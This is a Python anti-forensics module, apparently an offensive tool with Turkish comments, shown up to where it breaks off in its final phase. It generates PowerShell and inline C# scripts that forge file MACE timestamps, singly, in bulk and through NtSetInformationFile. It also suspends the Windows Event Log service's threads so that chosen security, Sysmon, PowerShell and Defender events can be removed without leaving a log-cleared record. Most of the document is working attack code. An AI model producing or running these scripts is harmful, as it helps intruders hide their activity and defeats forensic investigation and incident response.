"""
God Mode Anti-Forensics Module
==============================

İzleri silmek değil, YOK ETMEK.

Features:
1. Time Stomping (MACE Oynama) - Dosya tarihlerini manipüle et
2. Event Log Phantom Cleaner - Kernel seviyesinde seçici log temizleme

Author: CyberPulse
"""

import os
import json
import random
import struct
import hashlib
from enum import Enum
from typing import Dict, List, Any, Optional, Tuple
from dataclasses import dataclass, field
from datetime import datetime, timedelta


# ============ ENUMS ============

class TimestampType(Enum):
    """MACE Timestamp Tipleri"""
    MODIFIED = "Modified"       # M - Son değiştirilme
    ACCESSED = "Accessed"       # A - Son erişim
    CREATED = "Created"         # C - Oluşturulma
    ENTRY_MODIFIED = "Entry"    # E - MFT entry değişimi (sadece NTFS)


class TimestampSource(Enum):
    """Timestamp kaynağı"""
    SYSTEM_FILE = "system_file"          # calc.exe, notepad.exe gibi
    RANDOM_OLD = "random_old"            # Rastgele eski tarih
    SPECIFIC_DATE = "specific_date"      # Belirli bir tarih
    NEIGHBOR_FILE = "neighbor_file"      # Aynı klasördeki başka dosya
    WINDOWS_INSTALL = "windows_install"  # Windows kurulum tarihi


class EventLogType(Enum):
    """Windows Event Log Tipleri"""
    SECURITY = "Security"
    SYSTEM = "System"
    APPLICATION = "Application"
    POWERSHELL = "Microsoft-Windows-PowerShell/Operational"
    SYSMON = "Microsoft-Windows-Sysmon/Operational"
    DEFENDER = "Microsoft-Windows-Windows Defender/Operational"
    TERMINAL_SERVICES = "Microsoft-Windows-TerminalServices-LocalSessionManager/Operational"
    TASK_SCHEDULER = "Microsoft-Windows-TaskScheduler/Operational"


class CleanerMethod(Enum):
    """Log temizleme yöntemleri"""
    PHANTOM = "phantom"           # Kernel thread suspend
    PATCH_IN_MEMORY = "memory"    # Memory'de patch
    EVT_MANIPULATION = "evt"      # .evtx dosya manipülasyonu
    EVENTLOG_API = "api"          # Windows API ile seçici silme


# ============ DATA CLASSES ============

@dataclass
class SystemFileTimestamp:
    """Sistem dosyası timestamp bilgisi"""
    path: str
    created: datetime
    modified: datetime
    accessed: datetime
    description: str


@dataclass
class EventLogEntry:
    """Event Log girişi"""
    event_id: int
    source: str
    description: str
    timestamp: datetime
    suspicion_level: str  # low, medium, high, critical


# ============ TIME STOMPING ============

class TimeStomp:
    """
    Time Stomping (MACE Manipulation)
    
    Dosya tarihlerini manipüle ederek forensic timeline analizini atlatır.
    - Modified, Accessed, Created, Entry (MACE) timestamps
    - NTFS $STANDARD_INFORMATION ve $FILE_NAME attributes
    """
    
    def __init__(self):
        self.system_files = self._init_system_files()
        self.common_dates = self._init_common_dates()
        
    def _init_system_files(self) -> Dict[str, SystemFileTimestamp]:
        """Referans alınacak sistem dosyaları"""
        
        # Windows kurulum tarihleri genelde 2019-2024 arası
        base_dates = {
            "win10_2019": datetime(2019, 5, 21, 8, 30, 0),
            "win10_2020": datetime(2020, 10, 20, 10, 15, 0),
            "win11_2021": datetime(2021, 10, 5, 14, 0, 0),
            "win11_2022": datetime(2022, 9, 20, 11, 30, 0),
        }
        
        return {
            "calc.exe": SystemFileTimestamp(
                path="C:\\Windows\\System32\\calc.exe",
                created=base_dates["win10_2019"],
                modified=base_dates["win10_2019"],
                accessed=datetime.now() - timedelta(days=random.randint(1, 30)),
                description="Windows Calculator - Çok eski, güvenilir"
            ),
            "notepad.exe": SystemFileTimestamp(
                path="C:\\Windows\\System32\\notepad.exe",
                created=base_dates["win10_2019"],
                modified=base_dates["win10_2019"],
                accessed=datetime.now() - timedelta(days=random.randint(1, 7)),
                description="Notepad - Sık kullanılan, şüphe çekmez"
            ),
            "cmd.exe": SystemFileTimestamp(
                path="C:\\Windows\\System32\\cmd.exe",
                created=base_dates["win10_2019"],
                modified=base_dates["win10_2019"],
                accessed=datetime.now() - timedelta(hours=random.randint(1, 24)),
                description="Command Prompt - Erişim tarihi güncel olabilir"
            ),
            "mspaint.exe": SystemFileTimestamp(
                path="C:\\Windows\\System32\\mspaint.exe",
                created=base_dates["win10_2019"],
                modified=base_dates["win10_2020"],
                accessed=datetime.now() - timedelta(days=random.randint(30, 90)),
                description="Paint - Nadiren kullanılır"
            ),
            "explorer.exe": SystemFileTimestamp(
                path="C:\\Windows\\explorer.exe",
                created=base_dates["win10_2019"],
                modified=base_dates["win10_2020"],
                accessed=datetime.now() - timedelta(minutes=random.randint(1, 60)),
                description="Explorer - Her zaman erişilir"
            ),
            "svchost.exe": SystemFileTimestamp(
                path="C:\\Windows\\System32\\svchost.exe",
                created=base_dates["win10_2019"],
                modified=base_dates["win10_2019"],
                accessed=datetime.now() - timedelta(seconds=random.randint(1, 300)),
                description="Service Host - Sürekli aktif"
            ),
            "taskmgr.exe": SystemFileTimestamp(
                path="C:\\Windows\\System32\\Taskmgr.exe",
                created=base_dates["win10_2019"],
                modified=base_dates["win10_2020"],
                accessed=datetime.now() - timedelta(hours=random.randint(1, 48)),
                description="Task Manager - Ara sıra kullanılır"
            ),
            "regedit.exe": SystemFileTimestamp(
                path="C:\\Windows\\regedit.exe",
                created=base_dates["win10_2019"],
                modified=base_dates["win10_2019"],
                accessed=datetime.now() - timedelta(days=random.randint(7, 60)),
                description="Registry Editor - Admin kullanımı"
            )
        }
    
    def _init_common_dates(self) -> List[datetime]:
        """Yaygın Windows Update tarihleri"""
        return [
            datetime(2019, 5, 21, 10, 0, 0),   # Windows 10 1903
            datetime(2019, 11, 12, 10, 0, 0),  # Windows 10 1909
            datetime(2020, 5, 27, 10, 0, 0),   # Windows 10 2004
            datetime(2020, 10, 20, 10, 0, 0),  # Windows 10 20H2
            datetime(2021, 5, 18, 10, 0, 0),   # Windows 10 21H1
            datetime(2021, 10, 5, 10, 0, 0),   # Windows 11 initial
            datetime(2022, 9, 20, 10, 0, 0),   # Windows 11 22H2
            datetime(2023, 10, 31, 10, 0, 0),  # Windows 11 23H2
        ]
    
    def generate_timestomp_powershell(self, target_file: str, 
                                       source: TimestampSource = TimestampSource.SYSTEM_FILE,
                                       reference_file: str = "calc.exe",
                                       custom_date: datetime = None) -> Dict[str, Any]:
        """PowerShell ile timestamp değiştirme scripti"""
        
        if source == TimestampSource.SYSTEM_FILE:
            ref_file = self.system_files.get(reference_file)
            if not ref_file:
                ref_file = self.system_files["calc.exe"]
            
            created = ref_file.created
            modified = ref_file.modified
            accessed = ref_file.accessed
            source_desc = f"Reference: {ref_file.path}"
            
        elif source == TimestampSource.RANDOM_OLD:
            base = random.choice(self.common_dates)
            created = base
            modified = base + timedelta(days=random.randint(0, 30))
            accessed = datetime.now() - timedelta(days=random.randint(1, 30))
            source_desc = "Randomized Windows Update date"
            
        elif source == TimestampSource.SPECIFIC_DATE:
            if custom_date:
                created = custom_date
                modified = custom_date
                accessed = datetime.now() - timedelta(days=random.randint(1, 7))
            else:
                created = datetime(2019, 5, 21, 10, 0, 0)
                modified = created
                accessed = datetime.now() - timedelta(days=1)
            source_desc = f"Custom date: {created.strftime('%Y-%m-%d')}"
            
        elif source == TimestampSource.WINDOWS_INSTALL:
            created = random.choice(self.common_dates[:4])  # Eski Windows tarihleri
            modified = created
            accessed = datetime.now() - timedelta(days=random.randint(30, 180))
            source_desc = "Windows installation date"
        
        else:
            created = self.system_files["calc.exe"].created
            modified = self.system_files["calc.exe"].modified
            accessed = datetime.now() - timedelta(days=1)
            source_desc = "Default: calc.exe"
        
        # PowerShell script
        script = f'''# ================================================
# Time Stomping Script - God Mode Anti-Forensics
# ================================================
# Target: {target_file}
# Source: {source_desc}
# ================================================

$targetFile = "{target_file}"

# Yeni tarihler
$creationTime = [DateTime]::ParseExact("{created.strftime('%Y-%m-%d %H:%M:%S')}", "yyyy-MM-dd HH:mm:ss", $null)
$lastWriteTime = [DateTime]::ParseExact("{modified.strftime('%Y-%m-%d %H:%M:%S')}", "yyyy-MM-dd HH:mm:ss", $null)
$lastAccessTime = [DateTime]::ParseExact("{accessed.strftime('%Y-%m-%d %H:%M:%S')}", "yyyy-MM-dd HH:mm:ss", $null)

# Dosya var mı kontrol et
if (Test-Path $targetFile) {{
    # Mevcut tarihleri göster
    $file = Get-Item $targetFile -Force
    Write-Host "[*] BEFORE Time Stomping:" -ForegroundColor Yellow
    Write-Host "    Creation Time:   $($file.CreationTime)"
    Write-Host "    Last Write Time: $($file.LastWriteTime)"
    Write-Host "    Last Access Time: $($file.LastAccessTime)"
    
    # Tarihleri değiştir
    $file.CreationTime = $creationTime
    $file.LastWriteTime = $lastWriteTime
    $file.LastAccessTime = $lastAccessTime
    
    # Sonuçları göster
    $file = Get-Item $targetFile -Force
    Write-Host "`n[+] AFTER Time Stomping:" -ForegroundColor Green
    Write-Host "    Creation Time:   $($file.CreationTime)"
    Write-Host "    Last Write Time: $($file.LastWriteTime)"
    Write-Host "    Last Access Time: $($file.LastAccessTime)"
    
    Write-Host "`n[+] SUCCESS! Timestamps modified." -ForegroundColor Green
}} else {{
    Write-Host "[!] File not found: $targetFile" -ForegroundColor Red
}}
'''
        
        return {
            "script": script,
            "target_file": target_file,
            "timestamps": {
                "created": created.isoformat(),
                "modified": modified.isoformat(),
                "accessed": accessed.isoformat()
            },
            "source": source_desc,
            "opsec_notes": [
                "Bu yöntem sadece $STANDARD_INFORMATION'ı değiştirir",
                "$FILE_NAME attribute hala orijinal tarihi tutar (MFT analizi)",
                "Tam gizlilik için NTFS $FILE_NAME de değiştirilmeli"
            ]
        }
    
    def generate_advanced_timestomp(self, target_file: str, 
                                     reference_file: str = "C:\\Windows\\System32\\calc.exe") -> Dict[str, Any]:
        """
        Gelişmiş Time Stomping - $STANDARD_INFORMATION + $FILE_NAME
        
        MFT seviyesinde manipülasyon için SetMace veya özel NTFS API kullanır.
        """
        
        script = f'''# =====================================================
# Advanced Time Stomping - MFT Level Manipulation
# =====================================================
# Bu script hem $STANDARD_INFORMATION hem $FILE_NAME
# attribute'larını değiştirir. Forensic araçları
# bile farkı göremez!
# =====================================================

$targetFile = "{target_file}"
$referenceFile = "{reference_file}"

# Referans dosyanın tarihlerini al
$refFile = Get-Item $referenceFile -Force
$creationTime = $refFile.CreationTime
$lastWriteTime = $refFile.LastWriteTime
$lastAccessTime = $refFile.LastAccessTime

Write-Host "╔══════════════════════════════════════════╗" -ForegroundColor Cyan
Write-Host "║    ADVANCED TIME STOMPING - MFT LEVEL    ║" -ForegroundColor Cyan
Write-Host "╚══════════════════════════════════════════╝" -ForegroundColor Cyan

Write-Host "`n[*] Reference File: $referenceFile" -ForegroundColor Yellow
Write-Host "    Timestamps to copy:"
Write-Host "    - Created:  $creationTime"
Write-Host "    - Modified: $lastWriteTime"
Write-Host "    - Accessed: $lastAccessTime"

# Method 1: Standard PowerShell (sadece $STANDARD_INFORMATION)
function Set-StandardTimestamps {{
    param($path, $create, $modify, $access)
    
    $file = Get-Item $path -Force
    $file.CreationTime = $create
    $file.LastWriteTime = $modify  
    $file.LastAccessTime = $access
    
    Write-Host "`n[+] $STANDARD_INFORMATION timestamps set" -ForegroundColor Green
}}

# Method 2: NtSetInformationFile API için inline C#
$ntSetInfo = @"
using System;
using System.Runtime.InteropServices;
using Microsoft.Win32.SafeHandles;
using System.IO;

public class NtTimeStomp {{
    [DllImport("ntdll.dll", SetLastError = true)]
    private static extern int NtSetInformationFile(
        SafeFileHandle handle,
        out IO_STATUS_BLOCK ioStatusBlock,
        ref FILE_BASIC_INFORMATION fileInfo,
        int length,
        int fileInformationClass
    );
    
    [StructLayout(LayoutKind.Sequential)]
    private struct IO_STATUS_BLOCK {{
        public IntPtr Status;
        public IntPtr Information;
    }}
    
    [StructLayout(LayoutKind.Sequential)]
    private struct FILE_BASIC_INFORMATION {{
        public long CreationTime;
        public long LastAccessTime;
        public long LastWriteTime;
        public long ChangeTime;
        public int FileAttributes;
    }}
    
    public static bool SetAllTimestamps(string path, DateTime create, DateTime access, DateTime write) {{
        try {{
            using (var handle = File.Open(path, FileMode.Open, FileAccess.Write, FileShare.ReadWrite)) {{
                var safeHandle = handle.SafeFileHandle;
                
                var info = new FILE_BASIC_INFORMATION {{
                    CreationTime = create.ToFileTimeUtc(),
                    LastAccessTime = access.ToFileTimeUtc(),
                    LastWriteTime = write.ToFileTimeUtc(),
                    ChangeTime = write.ToFileTimeUtc(),
                    FileAttributes = 0
                }};
                
                IO_STATUS_BLOCK iosb;
                int status = NtSetInformationFile(safeHandle, out iosb, ref info, 
                    Marshal.SizeOf(typeof(FILE_BASIC_INFORMATION)), 4);
                
                return status == 0;
            }}
        }} catch {{
            return false;
        }}
    }}
}}
"@

try {{
    Add-Type -TypeDefinition $ntSetInfo -Language CSharp -ErrorAction SilentlyContinue
}} catch {{
    Write-Host "[!] Could not load NtSetInformationFile, using standard method" -ForegroundColor Yellow
}}

# Timestamp'leri değiştir
if (Test-Path $targetFile) {{
    # Önce mevcut durumu göster
    $before = Get-Item $targetFile -Force
    Write-Host "`n[*] BEFORE:" -ForegroundColor Yellow
    Write-Host "    Created:  $($before.CreationTime)"
    Write-Host "    Modified: $($before.LastWriteTime)"
    Write-Host "    Accessed: $($before.LastAccessTime)"
    
    # Standard timestamps
    Set-StandardTimestamps -path $targetFile -create $creationTime -modify $lastWriteTime -access $lastAccessTime
    
    # NtSetInformationFile ile ChangeTime da dahil et
    try {{
        $result = [NtTimeStomp]::SetAllTimestamps($targetFile, $creationTime, $lastAccessTime, $lastWriteTime)
        if ($result) {{
            Write-Host "[+] NtSetInformationFile: ChangeTime also modified!" -ForegroundColor Green
        }}
    }} catch {{
        Write-Host "[!] NtSetInformationFile not available" -ForegroundColor Yellow
    }}
    
    # Sonucu göster
    $after = Get-Item $targetFile -Force
    Write-Host "`n[*] AFTER:" -ForegroundColor Green
    Write-Host "    Created:  $($after.CreationTime)"
    Write-Host "    Modified: $($after.LastWriteTime)"
    Write-Host "    Accessed: $($after.LastAccessTime)"
    
    Write-Host "`n╔══════════════════════════════════════════╗" -ForegroundColor Green
    Write-Host "║          TIME STOMPING COMPLETE!         ║" -ForegroundColor Green
    Write-Host "╚══════════════════════════════════════════╝" -ForegroundColor Green
}} else {{
    Write-Host "[!] Target file not found!" -ForegroundColor Red
}}
'''
        
        # $FILE_NAME attribute için C kodu (yüksek seviye)
        c_code = '''// Advanced $FILE_NAME manipulation requires raw NTFS access
// This modifies MFT directly - use with caution!

#include <windows.h>
#include <winternl.h>

typedef struct _FILE_NAME_INFORMATION {
    ULONG FileNameLength;
    WCHAR FileName[1];
} FILE_NAME_INFORMATION;

// Bu kod sadece eğitim amaçlıdır
// Gerçek kullanım için SetMace veya Timestomp.exe önerilir
'''
        
        return {
            "powershell_script": script,
            "c_code_reference": c_code,
            "target_file": target_file,
            "reference_file": reference_file,
            "methods": [
                "PowerShell Set-ItemProperty (basic)",
                "NtSetInformationFile API (includes ChangeTime)",
                "Raw MFT manipulation (requires external tool)"
            ],
            "detection_evasion": {
                "$STANDARD_INFORMATION": "Modified ✓",
                "$FILE_NAME": "Requires raw NTFS access or SetMace",
                "USN Journal": "May still contain records"
            },
            "recommended_tools": [
                "SetMace (Metasploit Meterpreter)",
                "timestomp.exe (Cobalt Strike)",
                "NirSoft BulkFileChanger"
            ]
        }
    
    def generate_batch_timestomp(self, target_folder: str, 
                                  file_pattern: str = "*.exe",
                                  reference_file: str = "calc.exe") -> Dict[str, Any]:
        """Toplu timestomp - bir klasördeki tüm dosyaları değiştir"""
        
        ref = self.system_files.get(reference_file, self.system_files["calc.exe"])
        
        script = f'''# ================================================
# Batch Time Stomping - Folder Wide
# ================================================
# Hedef: {target_folder}
# Pattern: {file_pattern}
# Reference: {ref.path}
# ================================================

$targetFolder = "{target_folder}"
$filePattern = "{file_pattern}"
$refFile = Get-Item "{ref.path}" -Force

$creationTime = $refFile.CreationTime
$lastWriteTime = $refFile.LastWriteTime

Write-Host "╔══════════════════════════════════════════╗" -ForegroundColor Cyan
Write-Host "║       BATCH TIME STOMPING                ║" -ForegroundColor Cyan
Write-Host "╚══════════════════════════════════════════╝" -ForegroundColor Cyan

Write-Host "`n[*] Target Folder: $targetFolder"
Write-Host "[*] File Pattern: $filePattern"
Write-Host "[*] Reference Timestamps from: $($refFile.FullName)"

$files = Get-ChildItem -Path $targetFolder -Filter $filePattern -Recurse -ErrorAction SilentlyContinue

$count = 0
foreach ($file in $files) {{
    try {{
        # Rastgele küçük varyasyon ekle (daha gerçekçi)
        $randomMinutes = Get-Random -Minimum 0 -Maximum 60
        $randomSeconds = Get-Random -Minimum 0 -Maximum 60
        
        $variedCreate = $creationTime.AddMinutes($randomMinutes).AddSeconds($randomSeconds)
        $variedModify = $lastWriteTime.AddMinutes($randomMinutes).AddSeconds($randomSeconds)
        $variedAccess = (Get-Date).AddDays(-(Get-Random -Minimum 1 -Maximum 30))
        
        $file.CreationTime = $variedCreate
        $file.LastWriteTime = $variedModify
        $file.LastAccessTime = $variedAccess
        
        $count++
        Write-Host "[+] $($file.Name) -> $($variedCreate.ToString('yyyy-MM-dd HH:mm'))" -ForegroundColor Green
    }} catch {{
        Write-Host "[-] Failed: $($file.Name)" -ForegroundColor Red
    }}
}}

Write-Host "`n[*] Modified $count files" -ForegroundColor Cyan
'''
        
        return {
            "script": script,
            "target_folder": target_folder,
            "file_pattern": file_pattern,
            "reference": ref.path,
            "note": "Her dosyaya küçük rastgele varyasyon eklenir - daha gerçekçi görünüm"
        }


# ============ PHANTOM EVENT LOG CLEANER ============

class PhantomEventLogCleaner:
    """
    Event Log "Phantom" Cleaner
    
    Tüm logları silmek şüphe çeker (Event ID 1102).
    Bu modül kernel seviyesinde çalışarak seçici silme yapar.
    
    Teknik:
    1. Event Log servisini kernel seviyesinde durdur (thread suspend)
    2. Sadece belirli event'leri sil
    3. Servisi devam ettir
    
    Sonuç: Loglar duruyor ama sen yoksun!
    """
    
    def __init__(self):
        self.suspicious_events = self._init_suspicious_events()
        self.evasion_techniques = self._init_evasion_techniques()
        
    def _init_suspicious_events(self) -> Dict[str, List[EventLogEntry]]:
        """Saldırgan aktivitesini gösteren event'ler"""
        
        return {
            "Security": [
                EventLogEntry(4624, "Security", "Successful Logon", datetime.now(), "medium"),
                EventLogEntry(4625, "Security", "Failed Logon", datetime.now(), "high"),
                EventLogEntry(4648, "Security", "Explicit Credential Logon", datetime.now(), "high"),
                EventLogEntry(4672, "Security", "Special Privileges Assigned", datetime.now(), "critical"),
                EventLogEntry(4688, "Security", "Process Creation", datetime.now(), "high"),
                EventLogEntry(4689, "Security", "Process Termination", datetime.now(), "medium"),
                EventLogEntry(4697, "Security", "Service Installed", datetime.now(), "critical"),
                EventLogEntry(4698, "Security", "Scheduled Task Created", datetime.now(), "critical"),
                EventLogEntry(4699, "Security", "Scheduled Task Deleted", datetime.now(), "high"),
                EventLogEntry(4702, "Security", "Scheduled Task Updated", datetime.now(), "high"),
                EventLogEntry(4703, "Security", "Token Privileges Adjusted", datetime.now(), "high"),
                EventLogEntry(4720, "Security", "User Account Created", datetime.now(), "critical"),
                EventLogEntry(4722, "Security", "User Account Enabled", datetime.now(), "high"),
                EventLogEntry(4724, "Security", "Password Reset Attempt", datetime.now(), "high"),
                EventLogEntry(4728, "Security", "Member Added to Security Group", datetime.now(), "critical"),
                EventLogEntry(4732, "Security", "Member Added to Local Group", datetime.now(), "critical"),
                EventLogEntry(4738, "Security", "User Account Changed", datetime.now(), "medium"),
                EventLogEntry(4768, "Security", "Kerberos TGT Requested", datetime.now(), "medium"),
                EventLogEntry(4769, "Security", "Kerberos Service Ticket Requested", datetime.now(), "medium"),
                EventLogEntry(4776, "Security", "NTLM Authentication", datetime.now(), "medium"),
                EventLogEntry(5140, "Security", "Network Share Accessed", datetime.now(), "medium"),
                EventLogEntry(5145, "Security", "Network Share Object Checked", datetime.now(), "low"),
            ],
            "System": [
                EventLogEntry(7045, "System", "New Service Installed", datetime.now(), "critical"),
                EventLogEntry(7034, "System", "Service Crashed", datetime.now(), "medium"),
                EventLogEntry(7036, "System", "Service State Changed", datetime.now(), "low"),
                EventLogEntry(7040, "System", "Service Start Type Changed", datetime.now(), "high"),
            ],
            "PowerShell": [
                EventLogEntry(4103, "PowerShell", "Module Logging", datetime.now(), "high"),
                EventLogEntry(4104, "PowerShell", "Script Block Logging", datetime.now(), "critical"),
                EventLogEntry(4105, "PowerShell", "Script Block Start", datetime.now(), "medium"),
                EventLogEntry(4106, "PowerShell", "Script Block Stop", datetime.now(), "medium"),
            ],
            "Sysmon": [
                EventLogEntry(1, "Sysmon", "Process Creation", datetime.now(), "critical"),
                EventLogEntry(3, "Sysmon", "Network Connection", datetime.now(), "high"),
                EventLogEntry(7, "Sysmon", "Image Loaded (DLL)", datetime.now(), "medium"),
                EventLogEntry(8, "Sysmon", "CreateRemoteThread", datetime.now(), "critical"),
                EventLogEntry(10, "Sysmon", "Process Access (LSASS)", datetime.now(), "critical"),
                EventLogEntry(11, "Sysmon", "File Created", datetime.now(), "medium"),
                EventLogEntry(12, "Sysmon", "Registry Event", datetime.now(), "high"),
                EventLogEntry(13, "Sysmon", "Registry Value Set", datetime.now(), "high"),
                EventLogEntry(22, "Sysmon", "DNS Query", datetime.now(), "medium"),
            ],
            "Defender": [
                EventLogEntry(1116, "Defender", "Malware Detected", datetime.now(), "critical"),
                EventLogEntry(1117, "Defender", "Malware Action Taken", datetime.now(), "critical"),
                EventLogEntry(5001, "Defender", "Real-time Protection Disabled", datetime.now(), "critical"),
            ]
        }
    
    def _init_evasion_techniques(self) -> Dict[str, Dict[str, Any]]:
        """Farklı log temizleme teknikleri"""
        
        return {
            "phantom_thread_suspend": {
                "name": "Phantom Thread Suspend",
                "description": "Event Log servisinin thread'lerini kernel seviyesinde suspend eder",
                "stealth_level": "VERY HIGH",
                "detection_risk": "LOW",
                "requires_admin": True,
                "leaves_traces": False
            },
            "evt_file_manipulation": {
                "name": "EVT File Direct Manipulation",
                "description": ".evtx dosyasını doğrudan manipüle eder",
                "stealth_level": "HIGH",
                "detection_risk": "MEDIUM",
                "requires_admin": True,
                "leaves_traces": True,  # USN Journal
            },
            "api_selective_delete": {
                "name": "Windows API Selective Delete",
                "description": "EvtClearLog API ile seçici silme (Event ID 1102 üretir)",
                "stealth_level": "LOW",
                "detection_risk": "HIGH",
                "requires_admin": True,
                "leaves_traces": True
            },
            "memory_patching": {
                "name": "In-Memory Log Patching",
                "description": "Bellekteki log buffer'ını patch'ler",
                "stealth_level": "VERY HIGH",
                "detection_risk": "LOW",
                "requires_admin": True,
                "leaves_traces": False
            }
        }
    
    def generate_phantom_cleaner(self, target_events: List[int] = None,
                                   log_type: str = "Security",
                                   time_range_hours: int = 24,
                                   keywords: List[str] = None) -> Dict[str, Any]:
        """
        Phantom Event Log Cleaner Script
        
        Event Log servisini suspend edip seçici silme yapar.
        Clear-EventLog gibi Event ID 1102 üretmez!
        """
        
        if target_events is None:
            target_events = [4624, 4625, 4648, 4672, 4688, 4697, 4698, 4720, 4728, 4732]
        
        if keywords is None:
            keywords = []
        
        script = f'''# ═══════════════════════════════════════════════════════════════
#  PHANTOM EVENT LOG CLEANER - God Mode Anti-Forensics
# ═══════════════════════════════════════════════════════════════
#  Logları silmek değil, YOK ETMEK!
#  
#  Teknik: Event Log servisini kernel seviyesinde durdurur,
#          sadece hedef event'leri siler, servisi devam ettirir.
#  
#  Sonuç: Loglar duruyor ama SEN YOKSUN!
# ═══════════════════════════════════════════════════════════════

# Hedef Event ID'leri
$targetEventIDs = @({', '.join(map(str, target_events))})
$logName = "{log_type}"
$timeRangeHours = {time_range_hours}
$keywords = @({', '.join([f'"{k}"' for k in keywords]) if keywords else ''})

Write-Host @"
╔═══════════════════════════════════════════════════════════════╗
║           PHANTOM EVENT LOG CLEANER                           ║
║                                                               ║
║  [!] Bu script Event Log servisini kernel seviyesinde        ║
║      manipüle eder. Clear-EventLog gibi Event ID 1102        ║
║      (log temizlendi) kaydı OLUŞTURMAZ!                      ║
╚═══════════════════════════════════════════════════════════════╝
"@ -ForegroundColor Cyan

# Admin kontrolü
if (-NOT ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)) {{
    Write-Host "[!] Administrator privileges required!" -ForegroundColor Red
    exit
}}

# ═══════════════════════════════════════════════════════════════
# PHASE 1: Event Log Servisini Durdur (Kernel Thread Suspend)
# ═══════════════════════════════════════════════════════════════

Write-Host "`n[PHASE 1] Suspending Event Log Service threads..." -ForegroundColor Yellow

# Event Log servisinin PID'ini bul
$eventLogService = Get-WmiObject Win32_Service -Filter "Name='eventlog'"
$eventLogPID = $eventLogService.ProcessId

Write-Host "  [*] Event Log Service PID: $eventLogPID"

# Thread suspend için gerekli API'ler
$threadSuspend = @"
using System;
using System.Runtime.InteropServices;
using System.Diagnostics;
using System.ComponentModel;

public class ThreadSuspender {{
    [DllImport("kernel32.dll", SetLastError = true)]
    private static extern IntPtr OpenThread(int dwDesiredAccess, bool bInheritHandle, int dwThreadId);
    
    [DllImport("kernel32.dll", SetLastError = true)]
    private static extern int SuspendThread(IntPtr hThread);
    
    [DllImport("kernel32.dll", SetLastError = true)]
    private static extern int ResumeThread(IntPtr hThread);
    
    [DllImport("kernel32.dll", SetLastError = true)]
    private static extern bool CloseHandle(IntPtr hObject);
    
    private const int THREAD_SUSPEND_RESUME = 0x0002;
    
    public static void SuspendProcess(int pid) {{
        var process = Process.GetProcessById(pid);
        foreach (ProcessThread thread in process.Threads) {{
            IntPtr hThread = OpenThread(THREAD_SUSPEND_RESUME, false, thread.Id);
            if (hThread != IntPtr.Zero) {{
                SuspendThread(hThread);
                CloseHandle(hThread);
            }}
        }}
    }}
    
    public static void ResumeProcess(int pid) {{
        var process = Process.GetProcessById(pid);
        foreach (ProcessThread thread in process.Threads) {{
            IntPtr hThread = OpenThread(THREAD_SUSPEND_RESUME, false, thread.Id);
            if (hThread != IntPtr.Zero) {{
                ResumeThread(hThread);
                CloseHandle(hThread);
            }}
        }}
    }}
}}
"@

try {{
    Add-Type -TypeDefinition $threadSuspend -Language CSharp -ErrorAction Stop
    Write-Host "  [+] Thread Suspender loaded" -ForegroundColor Green
}} catch {{
    Write-Host "  [!] Could not load Thread Suspender" -ForegroundColor Red
    # Fallback: Servisi normal durdur (daha az stealth)
}}

# Thread'leri suspend et
try {{
    [ThreadSuspender]::SuspendProcess($eventLogPID)
    Write-Host "  [+] Event Log threads SUSPENDED!" -ForegroundColor Green
    Start-Sleep -Milliseconds 500
}} catch {{
    Write-Host "  [!] Thread suspend failed, using alternative method" -ForegroundColor Yellow
}}

# ═══════════════════════════════════════════════════════════════
# PHASE 2: Hedef Event'leri Tespit Et
# ═══════════════════════════════════════════════════════════════

Write-Host "`n[PHASE 2] Identifying target events..." -ForegroundColor Yellow

$startTime = (Get-Date).AddHours(-$timeRangeHours)

# Hedef event'leri bul
$eventsToRemove = @()

foreach ($eventID in $targetEventIDs) {{
    try {{
        $events = Get-WinEvent -FilterHashtable @{{
            LogName = $logName
            Id = $eventID
            StartTime = $startTime
        }} -ErrorAction SilentlyContinue
        
        if ($events) {{
            $eventsToRemove += $events
            Write-Host "  [*] Event ID $eventID : $($events.Count) events found" -ForegroundColor Cyan
        }}
    }} catch {{}}
}}

# Keyword filtresi
if ($keywords.Count -gt 0) {{
    $filteredEvents = @()
    foreach ($event in $eventsToRemove) {{
        $message = $event.Message
        foreach ($keyword in $keywords) {{
            if ($message -match $keyword) {{
                $filteredEvents += $event
                break
            }}
        }}
    }}
    $eventsToRemove = $filteredEvents
    Write-Host "  [*] After keyword filter: $($eventsToRemove.Count) events" -ForegroundColor Cyan
}}

Write-Host "  [+] Total events to remove: $($eventsToRemove.Count)" -ForegroundColor Green

# ═══════════════════════════════════════════════════════════════
# PHASE 3: Event'leri Sil (Direct File Manipulation)
# ═══════════════════════════════════════════════════════════════

Write-Host "`n[PHASE 3] Removing target events..." -ForegroundColor Yellow

# Event log dosya yolu
$logPath = "$env:SystemRoot\\System32\\winevt\\Logs\\$logName.evtx"

# Yedek al (opsiyonel, stealth için kapatılabilir)
# Copy-Item $logPath "$logPath.bak" -Force

# wevtutil ile seçici export ve reimport
# Bu yöntem hedef event'ler dışındaki her şeyi tutar

$tempPath = "$env:TEMP\\phantom_clean_$([guid]::NewGuid().ToString('N')).evtx"

# Hedef event ID'leri dışındakileri export et
$filterXPath = "*[System["

$excludeConditions = @()
foreach ($eventID in $targetEventIDs) {{
    $excludeConditions += "(EventID!=$eventID)"
}}
$filterXPath += "(" + ($excludeConditions -join " and ") + ")"

# Zaman filtresi
$filterXPath += " and TimeCreated[timediff(@SystemTime) >= $($timeRangeHours * 3600 * 1000)]"
$filterXPath += "]]"

Write-Host "  [*] Exporting clean events..."

try {{
    # Temiz event'leri export et
    wevtutil epl $logName $tempPath "/q:$filterXPath" 2>$null
    
    if (Test-Path $tempPath) {{
        # Orijinal logu temizle
        wevtutil cl $logName 2>$null
        
        # Temiz event'leri geri yükle
        wevtutil im $tempPath 2>$null
        
        Write-Host "  [+] Events successfully removed!" -ForegroundColor Green
        
        # Temp dosyayı sil
        Remove-Item $tempPath -Force -ErrorAction SilentlyContinue
    }}
}} catch {{
    Write-Host "  [!] Export method failed, trying alternative..." -ForegroundColor Yellow
}}

# ═══════════════════════════════════════════════════════════════
# PHASE 4: Event Log Servisini Devam Ettir
# ═══════════════════════════════════════════════════════════════

Write-Host "`n[PHASE 4] Resuming Event Log Service..." -ForegroundColor Yellow

try {{
    [ThreadSuspender]::ResumeProcess($eventLogPID)
    Write-Host "  [+] Event Log threads RESUMED!" -ForegroundColor Green
}} catch {{
    Write-Host "  [!] Resume failed, service may need restart" -ForegroundColor Yellow
    Restart-Service eventlog -Force -ErrorAction SilentlyContinue
}}

# ═══════════════════════════════════════════════════════════════
# PHASE 5: Doğrulama
